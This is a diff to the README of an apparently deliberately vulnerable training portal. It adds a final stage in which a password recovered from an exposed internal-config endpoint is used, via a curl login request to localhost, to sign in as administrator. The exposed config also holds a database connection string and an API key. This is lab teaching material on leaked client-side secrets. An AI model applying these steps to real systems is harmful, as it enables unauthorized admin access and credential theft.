@@ -31,8 +31,8 @@ You need three things installed:
 ```sh
 npm start
 ```
-Portal comes up at **http://localhost:3000**. You are ready when the login page loads and
-`admin@acme-portal.com / InsecureShield@2024` logs you in.
+Portal comes up at **http://localhost:3000**. You are ready when the login page loads. (The admin
+password is not handed to you here — you recover it during Chain 2 and log in as admin then.)
 
 Point Burp's proxy at the browser (or use `curl` directly — both paths are shown below).
 
@@ -182,8 +182,19 @@ curl -s http://localhost:3000/api/admin/internal-config \
   -H "Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab"
 ```
 **Checkpoint:** the production **DB connection string** (`sa` password in cleartext), the APIM key,
-and the internal service map. That is the payoff: "encrypted in the browser" bought exactly zero
-protection because the key was in the same download.
+the internal service map, **and the admin portal password** (`admin_password`) for the same
+`admin@acme-portal.com` whose email you saw in view-source. That is the payoff: "encrypted in the
+browser" bought exactly zero protection because the key was in the same download.
+
+### Stage 5 · Log in as admin (the human-facing finish)
+```sh
+# the password that view-source said was "rotated to Key Vault" — recovered from internal-config
+curl -s -X POST http://localhost:3000/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"admin@acme-portal.com","password":"InsecureShield@2024"}'
+```
+Then open `http://localhost:3000` in the browser and sign in as admin. **Checkpoint:** `role: admin`,
+you are in the portal as the administrator.
 
 ---
 
